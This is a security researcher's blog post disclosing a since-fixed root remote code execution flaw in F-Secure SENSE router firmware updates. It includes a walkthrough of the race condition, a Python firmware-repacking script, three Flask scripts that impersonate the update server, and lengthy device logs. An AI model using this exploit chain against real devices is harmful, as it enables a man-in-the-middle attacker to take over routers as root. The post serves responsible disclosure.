---
layout: post
title:  "Pwning F-Secure SENSE Firmware Upgrade"
date:   2019-10-05 11:13:37 +0100
categories: bug
---

<style>
code {
  white-space : pre-wrap !important;
}
</style>

# **root RCE** in F-Secure SENSE

I did some security research in the SENSE and found this curious bug.

I'm an F-Secure employee and I reported this as part of an internal bug-bounty program which is specifically set up for the purpose of catching vulnerabilities by friendly researchers before they become an attack tool for malicious actors.

Note: the bug bounty or vulnerability reward program is open also to **external researches**, currently.
See: [Vulnerability reward program F-Secure](https://www.f-secure.com/gb-en/business/programs/vulnerability-reward-program)

### The Bug

A **Remote Command Execution (RCE) as root** was found in **F-Secure's SENSE** router by exploiting the *fsupdate_daemon* to run an arbitrary shell script.
The attack requires Man-In-The-Middle (MITM) between the SENSE and the Internet and takes ~2 hours. Furthermore, the attack is only possible when a new firmware upgrade is released from F-Secure.

The vulnerability type is a **Time Of Check Time of Use (TOCTOU)** in the *fsupdate_daemon* as an attacker is able to overwrite legitimate updates that have not yet been installed but are in a pending state (pending firmware updates attempt installation every hour), therefore taking over the system.

### Timeline

 * 0day with PoC reported to F-Secure - 16th of August
 * Fix released in testing - 30th of August
 * Fix released to the public in version +1.9.4.551 - 5th of September
 * Bounty awarded - 18th of September

I got into the [F-Secure Hall of fame](https://www.f-secure.com/gb-en/business/programs/vulnerability-reward-program/hall-of-fame) for this bug.

### Vulnerability walkthrough

This critical vulnerability was due to logic issues in the *fsupdate_daemon* binary that runs as root as it needs capabilities to flash new firmware updates. The daemon downloads/verifies/installs new firmware updates on the smart router. To understand how I got to it you need to understand the logic behind the update daemon.


The *fsupdate_daemon* behavior can be summarized as follows:
 1. Startup delay of 2 minutes
 2. Checks for new firmware version and if available downloads and verifies it. If valid, sets it as pending, then check for a pending installation and eventually run its **fsupgrade**
 3. Goes to sleep for 1 hour and goes back to step 2

The update daemon a.k.a *fsupdate_daemon* has a startup delay of 2 minutes after which it checks for updates. The check happens as follow:
 - The daemon sends an **HTTP POST** request to the update server for the **/q URL**
 - The response is a huge **JSON file** with all kind of different packages, including the sense-firmware. The response includes type, version and cookie for each package.. like this:
 ```json
 {"updates": [...{"cookie": "96c7329d", "version": 1554196376, "type": "sense-firmware"}...]}
 ```


 We can easily trigger a new update by sending a different version number than the one installed on the SENSE or the one offered by the official update server. Weirdly, the update daemon tries also to download older firmware version if presented (remember version number are timestamps). If there is a new update, the *fsupdate_daemon* will issue 2/3 more **HTTP GET** requests to grab the info on the specific update. These look like:

  - **HTTP GET** `/h;t=sense-firmware;v=1554196376;c=96c7329d`         (v is the version and c the cookie)

  will return metadata that describes the structure of the firmware update at issue:
  ```json
  {
      "cookie": "96c7329d",
      "files": [
          {
              "filename": "sense-firmware.mf",
              "sha256": "fe538892b4db5efaa01a65ce88854442c7cf9d8695b571b1b522f22182169612",
              "size": 10062
          },
          {
              "filename": "openwrt-rtkmips-rtl8198c-AP-fw.bin",
              "sha256": "afd39c13d05b41904ac28ccd17a940ccc69d072dffa94c7baaf1aa3e8ad7aacb",
              "size": 17301508
          },
          {
              "filename": "sense-firmware.ini",
              "sha256": "047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9",
              "size": 239
          },
          {
              "filename": "fsupgrade",
              "sha256": "59cbc90c560ceeda6292a0a8b64377144566a77e25d02cdeb9b33e511ddeebc9",
              "size": 1844
          }
      ],
      "title": "F-Secure SENSE Firmware Update 2019-04-02_01",
      "type": "sense-firmware",
      "version": 1554196376
  }
```

  - **HTTP GET** `/o;t=sense-firmware;v=1554196376;c=96c7329d`

 will return the *size* and *location* of the firmware update binary:
  ```json
  {"guts2ar1": {"id": "bd0feb5e499782182c6315d06d2803fcd1c24fcc88e9a02a2012050b0d4d0832_archive", "size": 16706369}}
  ```

 `id` will trigger a new request to download the compressed binary update:

 - **HTTP GET** `/f/bd0feb5e499782182c6315d06d2803fcd1c24fcc88e9a02a2012050b0d4d0832_archive`

The file looks like this:
```bash
tomas@box:~/...$ xxd out | head
│00000000: 4755 5453 3241 5231 0000 0000 0000 181e  GUTS2AR1........                   
│00000010: 425a 4950 3200 0000 0000 0040 6665 3533  BZIP2......@fe53                   
│00000020: 3838 3932 6234 6462 3565 6661 6130 3161  8892b4db5efaa01a                   
│00000030: 3635 6365 3838 3835 3434 3432 6337 6366  65ce88854442c7cf                   
│00000040: 3964 3836 3935 6235 3731 6231 6235 3232  9d8695b571b1b522                   
│00000050: 6632 3231 3832 3136 3936 3132 425a 6839  f22182169612BZh9                   
│00000060: 3141 5926 5359 bbd9 0a57 0002 ca7f ffff  1AY&SY...W......                   
│00000070: ffff ffff ffff ffff ffff ffff ffff ffff  ................                   
│00000080: ffff ffff ffff ffff ffff ffff ffff ffe0  ................                   
│00000090: 129e ae77 2f8b bb5d 6be1 76d7 5d47 605b  ...w/..]k.v.]G`[           
```


 Each compressed binary update file that is downloaded over HTTP from the update server is a collection of more files, I have seen 4 in the releases I have analyzed:
  - **sense-firmware.ini** (contains generic info such as date and version number for the firmware)
  - **sense-firmware.mf** (contains binary blob with signatures, hashes and other stuff)
  - **openwrt-rtkmips-rtl8198c-AP-fw.bin** (actual custom firmware for the router)
  - **fsupgrade** (a shell script used to run the update once all the files have been downloaded and verified)

 Note: The command to flash the new firmware is executed as last ( `sysupgrade -v $FIRMWARE`) in **fsupgrade**.

 The **fsupgrade** script contains the following code snippet:
 ```bash
 [...]
 if [ "$setup_completed" -eq 1 -a "$uptime" -gt 300 -a "$skip_count" -lt 24 ]; then
     if [ "$slot" -ge 0 -a "$slot" -le 23 -a "$slot" -ne "$hour" ]; then
         echo $((skip_count+1)) > $SKIPCOUNT
         logger -s "Out of upgrade slot $slot, skipping firmware update"
         exit 111
     fi
 fi
 [...]

 ```



 The previous code code checks that the Sense's initial setup with the smartphone has been completed, that the router is up from more than 300 seconds and that the `$skip_count` variable is less than 24. The `$skip_count` is a counter stored in `/tmp/.skipcount` and it is used to delay firmware updates for a max of 24 hours. Because of its location, it's zeroed every boot and remember this script runs only when a valid update is downloaded, verified, set as pending and then executed.

 If the first `if` is true then the code checks that the `$slot` variable is `>= 0 && <= 23` and that it is different from the current hour.  `$slot` seems to be the variable that defines at which time the update will be installed, because avoiding the `if` will allow the upgrade to continue.
 `$slot` is initialized as follows:
 ```bash
 slot=$(uci get fsupdate.settings.user_timeslot)
 [ -z "$slot" ] && slot=$(uci get fsupdate.settings.default_timeslot)
 [ -z "$slot" ] && slot=-1
 ```

 `$slot`, was always initialized as 4. Both `(uci get fsupdate.settings.user_timeslot)` and `$(uci get fsupdate.settings.default_timeslot)` gave 4. 4am good time for firmware updates, I guess.

 If both the if statements are true the update script exit to delay the actual firmware with a message like:
 ```
 root: Schedule check: setup_completed=1 uptime=2246 skip_count=0 slot=4 hour=17
 root: Out of upgrade slot 4, skipping firmware update
```
 In other words, the installation runs only at 4 something a.m.

 If the script terminates (it's not 4am) the daemon will sleep 1 hour and then attempts to download new updates and then in case it fails it tries again to install the pending firmware with the previous fsupgrade file.

 The attacker in this scenario wants to exploit the firmware update installation delay mechanism to run his malicious script instead of the **fsupgrade** script by overwriting the genuine firmware update while it's still in a pending state.

### Exploit

Requirements:
 * Attacker is MITM between SENSE and the Internet
 * New firmware is available from F-Secure for SENSE

Attack:
1. SENSE checks for updates, it downloads the new genuine firmware update from the server (version **x**), it verifies successfully the update, it sets it as pending, it checks if there is any pending update, it runs the **fsupgrade** of the pending update that will delay installation, the daemon goes to sleep for 55 minutes.
2. SENSE checks for updates, MITM attacker provides malicious firmware with version **x+1**. SENSE downloads it, verification fails, it checks if there is any pending update, it runs the **fsupgrade** of the pending update that will delay installation, the daemon goes to sleep for 55 minutes.
3. SENSE checks for updates, MITM attacker provides malicious firmware with version **x**. SENSE downloads it and overwrite the genuine update downloaded at *step 1*. Verification fails, but the daemon checks if there is any pending update, it runs the pending update that **Oops** was just overwritten by the malicious update just downloaded. **RCE**.


### Testing setup

To implement the attack I had to first download the binary compressed update file as described. I then used `binwalk -e ` to extract the files and explore the content. Then, I wrote a python script to assemble the binary compressed update file back, by combining official releases of the SENSE with custom payloads. 3 Python scripts with Flask mimic the update server to serve the required JSON to trick the Sense into believing there are new updates and download them. I simulated the MITM by hard-coding my local IP in the `/etc/hosts` file.

**assemble.py** - script used to assemble custom firmware packages

```python
from sys import argv
import hashlib
import os
import struct

def compress(filename):
    os.system('bzip2 ' + filename)
    new_script = open(filename+'.bz2', 'rb')
    return new_script.read()

def calcSHA256(filename):
    sha256_hash = hashlib.sha256()
    with open(filename,"rb") as f:
        for byte_block in iter(lambda: f.read(4096),b""):
            sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

if len(argv) != 6:
    print argv[0]+" outputfile manifest injected bin ini"
    exit(1)


manifestSHA = calcSHA256(argv[2])
manifest = compress(argv[2])
scriptSHA = calcSHA256(argv[3])
script = compress(argv[3])
binSHA = calcSHA256(argv[4])
bin = compress(argv[4])
iniSHA = calcSHA256(argv[5])
ini = compress(argv[5])

os.system('bzip2 -d ' + argv[2]+'.bz2')
os.system('bzip2 -d ' + argv[3]+'.bz2')
os.system('bzip2 -d ' + argv[4]+'.bz2')
os.system('bzip2 -d ' + argv[5]+'.bz2')

outputfile = open(argv[1], 'wb')
outputfile.write('GUTS2AR1')
outputfile.write(b'\x00\x00\x00\x00')
outputfile.write(struct.pack('>I', len(manifest))) #\x00\x00\x18\x1e
outputfile.write('\x42\x5a\x49\x50\x32\x00\x00\x00\x00\x00\x00\x40')
outputfile.write(manifestSHA)
outputfile.write(manifest)
outputfile.write('GUTS2AR1')
outputfile.write(b'\x00\x00\x00\x00')
outputfile.write(struct.pack('>I', len(script)))
outputfile.write('\x42\x5a\x49\x50\x32\x00\x00\x00\x00\x00\x00\x40')
outputfile.write(scriptSHA)
outputfile.write(script)
outputfile.write('GUTS2AR1')
outputfile.write(b'\x00\x00\x00\x00')
outputfile.write(struct.pack('>I', len(bin)))
outputfile.write('\x42\x5a\x49\x50\x32\x00\x00\x00\x00\x00\x00\x40')
outputfile.write(binSHA)
outputfile.write(bin)
outputfile.write('GUTS2AR1')
outputfile.write(b'\x00\x00\x00\x00')
outputfile.write(struct.pack('>I', len(ini)))
outputfile.write('\x42\x5a\x49\x50\x32\x00\x00\x00\x00\x00\x00\x40')
outputfile.write(iniSHA)
outputfile.write(ini)
outputfile.write('GUTS2AR1')
outputfile.close()

print calcSHA256(argv[1])

```

---------------------------------------------------------------

**fw_upgrade.py** - Flask script to execute part 1 of the attack

```python
from flask import Flask
import os

app = Flask(__name__)


@app.route('/f/17aa3e173e5e90b950741390f1d2286fe1028b66710eac1fcfcee93be7851e59_archive', methods = ['GET'])
def fun3():
    x = open('out', 'rb')
    content = x.read()
    x.close()
    return content


@app.route('/o;t=sense-firmware;v=1554196376;c=96c7329d', methods = ['GET'])
def fun2():
    return '{"guts2ar1": {"id": "17aa3e173e5e90b950741390f1d2286fe1028b66710eac1fcfcee93be7851e59_archive", "size": '+str(os.path.getsize('out'))+'}}'
#16706357

@app.route('/h;t=sense-firmware;v=1554196376;c=96c7329d', methods = ['GET'])
def fun():
    return '{"cookie": "96c7329d", "files": [{"filename": "sense-firmware.mf", "sha256": "fe538892b4db5efaa01a65ce88854442c7cf9d8695b571b1b522f22182169612", "size": 10062}, {"filename": "openwrt-rtkmips-rtl8198c-AP-fw.bin", "sha256": "afd39c13d05b41904ac28ccd17a940ccc69d072dffa94c7baaf1aa3e8ad7aacb", "size": 17301508}, {"filename": "sense-firmware.ini", "sha256": "047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9", "size": 239}, {"filename": "fsupgrade", "sha256": "a46e6817b25fcd339b43db2b306a6ec9a5613afa9827288217de7346f3ca4e22", "size": 1825}], "title": "F-Secure Sense Firmware Update 2019-06-02_01", "type": "sense-firmware", "version": 1554196376}'


@app.route('/q', methods = ['POST'])
def hello():
    return '{"updates": [{"cookie": "96c7329d", "version": 1554196376, "type": "sense-firmware"}]}'


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

```

----------------------------------------------------------

**fw_upgrade2.py** - Flask script to execute part 2 of the attack

```python
from flask import Flask
import os

app = Flask(__name__)


@app.route('/f/bd0feb5e499782182c6315d06d2803fcd1c24fcc88e9a02a2012050b0d4d0832_archive', methods = ['GET'])
def fun3():
    x = open('out2', 'rb')
    content = x.read()
    x.close()
    return content

@app.route('/o;t=sense-firmware;v=1554196377;c=96c7329d;pv=1554196376;pc=96c7329d', methods = ['GET'])
def fun2():
    return '{"guts2ar1": {"id": "bd0feb5e499782182c6315d06d2803fcd1c24fcc88e9a02a2012050b0d4d0832_archive", "size": '+str(os.path.getsize('out2'))+'}}'
#16706357


@app.route('/h;t=sense-firmware;v=1554196377;c=96c7329d', methods = ['GET'])
def fun():
    return '{"cookie": "96c7329d", "files": [{"filename": "sense-firmware.mf", "sha256": "fe538892b4db5efaa01a65ce88854442c7cf9d8695b571b1b522f22182169612", "size": 10062}, {"filename": "openwrt-rtkmips-rtl8198c-AP-fw.bin", "sha256": "afd39c13d05b41904ac28ccd17a940ccc69d072dffa94c7baaf1aa3e8ad7aacb", "size": 17301508}, {"filename": "sense-firmware.ini", "sha256": "047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9", "size": 239}, {"filename": "fsupgrade", "sha256": "59cbc90c560ceeda6292a0a8b64377144566a77e25d02cdeb9b33e511ddeebc9", "size": 1844}], "title": "F-Secure Sense Firmware Update 2019-07-02_01", "type": "sense-firmware", "version": 1554196377}'


@app.route('/q', methods = ['POST'])
def hello():
    return '{"updates": [{"cookie": "96c7329d", "version": 1554196377, "type": "sense-firmware"}]}'


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

```

---------------------------------------------------------------

**fw_upgrade3.py** - Flask script to execute part 3 of the attack (final)

```python
from flask import Flask
import os

app = Flask(__name__)


@app.route('/f/bd0feb5e499782182c6315d06d2803fcd1c24fcc88e9a02a2012050b0d4d0832_archive', methods = ['GET'])
def fun3():
    x = open('out2', 'rb')
    content = x.read()
    x.close()
    return content

@app.route('/o;t=sense-firmware;v=1554196376;c=96c7329d;pv=1554196377;pc=96c7329d', methods = ['GET'])
def fun2():
    return '{"guts2ar1": {"id": "bd0feb5e499782182c6315d06d2803fcd1c24fcc88e9a02a2012050b0d4d0832_archive", "size": '+str(os.path.getsize('out2'))+'}}'
#16706357


@app.route('/h;t=sense-firmware;v=1554196376;c=96c7329d', methods = ['GET'])
def fun():
    return '{"cookie": "96c7329d", "files": [{"filename": "sense-firmware.mf", "sha256": "fe538892b4db5efaa01a65ce88854442c7cf9d8695b571b1b522f22182169612", "size": 10062}, {"filename": "openwrt-rtkmips-rtl8198c-AP-fw.bin", "sha256": "afd39c13d05b41904ac28ccd17a940ccc69d072dffa94c7baaf1aa3e8ad7aacb", "size": 17301508}, {"filename": "sense-firmware.ini", "sha256": "047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9", "size": 239}, {"filename": "fsupgrade", "sha256": "59cbc90c560ceeda6292a0a8b64377144566a77e25d02cdeb9b33e511ddeebc9", "size": 1844}], "title": "F-Secure Sense Firmware Update 2019-07-02_01", "type": "sense-firmware", "version": 1554196376}'


@app.route('/q', methods = ['POST'])
def hello():
    return '{"updates": [{"cookie": "96c7329d", "version": 1554196376, "type": "sense-firmware"}]}'


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```


----------------------------------------------------------

## Attack log

Initial firmware version:
```
[Version]
File_set_version=1539865877
File_set_release_date=2018-10-18
File_set_visible_version=2018-10-18_01
File_set_release_time=12:31:17
```

The fsupdate_daemon is normally executed on the Sense with this command line:
```bash
/usr/bin/fsupdate_daemon -s http://guts2.sp.f-secure.com/ -b 1
```

I modified it to get debug and verbose output:
```bash
/usr/bin/fsupdate_daemon -s http://guts2.sp.f-secure.com/ -b 1 -vvv -d
```


### [CLIENT LOG]
```
...
root@SenseF0:27:45:04:2E:E0:~# /usr/bin/fsupdate_daemon -s http://guts2.sp.f-secure.com/ -b 1 -vvv -d
fsupdate_daemon[3561]: main: starting fsupdate_daemon
fsupdate_daemon[3561]: main: working_dir: /data/fsupdate
fsupdate_daemon[3561]: main: guts2_server: http://guts2.sp.f-secure.com/
fsupdate_daemon[3561]: main: guts2_dir: /data/guts2
fsupdate_daemon[3561]: main: guts2_cert: /etc/certs/guts2.crt
fsupdate_daemon[3561]: main: daas2_dir: /etc/f-secure/daas2
fsupdate_daemon[3561]: main: boot_bank: 1
fsupdate_daemon[3561]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[3561]: verify: >>> verify firmware upgrade
fsupdate_daemon[3561]: verify: <<< no pending
fsupdate_daemon[3561]: run: startup delay 2 minutes
```
**... (here it starts downloading the legit firmware update from fw_upgrade.py)**
```
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12978715
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12974619
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12970523
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12966427
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12962331
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12958235
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12954139
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12950043
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12945947
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12941851
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12937755
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12933659
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12929563
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12925467
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12921371
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12917275
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[3664]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 0
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 12913179
fsupdate_daemon[3664]: fsguts2.c:3673[13] data 0x68cb00, size 4096, stream 0x690cc8
...
fsupdate_daemon[3664]: fsbzip2.c:453[13] BZ_STREAM_END
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 56948
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 2587, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 2587, result 2587, i64 2587, streamleft 2587
fsupdate_daemon[3664]: fsguts2.c:4162[13] end of stream reached
fsupdate_daemon[3664]: fsguts2.c:4913[13] verified files set to 3
fsupdate_daemon[3664]: fsguts2.c:3803[13] header complete
fsupdate_daemon[3664]: fsguts2.c:4397[13] magic 'GUTS2AR1' ok
fsupdate_daemon[3664]: fsguts2.c:4426[13] stream encoding is bzip2
fsupdate_daemon[3664]: fsguts2.c:4431[13] file name length 64
fsupdate_daemon[3664]: fsguts2.c:3867[13] filename '047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9' read complete
fsupdate_daemon[3664]: fsguts2.c:2605[13] a matching hash '047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9' found
fsupdate_daemon[3664]: fsguts2.c:3995[13] output file path '/data/guts2/sense-firmware/1554196376/sense-firmware.ini'
fsupdate_daemon[3664]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 4
fsupdate_daemon[3664]: fsbzip2.c:449[13] 182 compressed bytes consumed, 0 left
fsupdate_daemon[3664]: fsbzip2.c:453[13] BZ_STREAM_END
fsupdate_daemon[3664]: fsbzip2.c:461[13] count 239
fsupdate_daemon[3664]: fsguts2.c:4149[13] count 182, bz2left 0
fsupdate_daemon[3664]: fsguts2.c:4155[13] bz2left 0, datalen 182, result 182, i64 182, streamleft 182
fsupdate_daemon[3664]: fsguts2.c:4162[13] end of stream reached
fsupdate_daemon[3664]: fsguts2.c:4913[13] verified files set to 4
fsupdate_daemon[3664]: fsguts2.c:4621[13] fe538892b4db5efaa01a65ce88854442c7cf9d8695b571b1b522f22182169612: sense-firmware.mf (10062, 1)
fsupdate_daemon[3664]: fsguts2.c:4621[13] afd39c13d05b41904ac28ccd17a940ccc69d072dffa94c7baaf1aa3e8ad7aacb: openwrt-rtkmips-rtl8198c-AP-fw.bin (17301508, 1)
fsupdate_daemon[3664]: fsguts2.c:4621[13] 047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9: sense-firmware.ini (239, 1)
fsupdate_daemon[3664]: fsguts2.c:4621[13] a46e6817b25fcd339b43db2b306a6ec9a5613afa9827288217de7346f3ca4e22: fsupgrade (1825, 1)
fsupdate_daemon[3664]: operator(): 100% downloaded
fsupdate_daemon[3664]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[3664]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[3664]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[3664]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[3664]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[3664]: adt/fshash.c:328[13] start growing hashtable to 21 slots
fsupdate_daemon[3664]: fsguts2.c:2401[13] type sense-firmware
fsupdate_daemon[3664]: fsguts2.c:2408[13] version 1554196376
fsupdate_daemon[3664]: fsguts2.c:2414[13] title F-Secure Sense Firmware Update 2019-06-02_01
fsupdate_daemon[3664]: fsguts2.c:2421[13] cookie 96c7329d
fsupdate_daemon[3664]: adt/fshash.c:965[13] replacing the main hash array with the bigger one
fsupdate_daemon[3664]: fsguts2.c:2447[13] file #0
fsupdate_daemon[3664]: fsguts2.c:2456[13] filename sense-firmware.mf
fsupdate_daemon[3664]: fsguts2.c:2473[13] size 10062
fsupdate_daemon[3664]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[3664]: fsguts2.c:2525[13] sha256 fe538892b4db5efaa01a65ce88854442c7cf9d8695b571b1b522f22182169612
fsupdate_daemon[3664]: fsguts2.c:2447[13] file #1
fsupdate_daemon[3664]: fsguts2.c:2456[13] filename openwrt-rtkmips-rtl8198c-AP-fw.bin
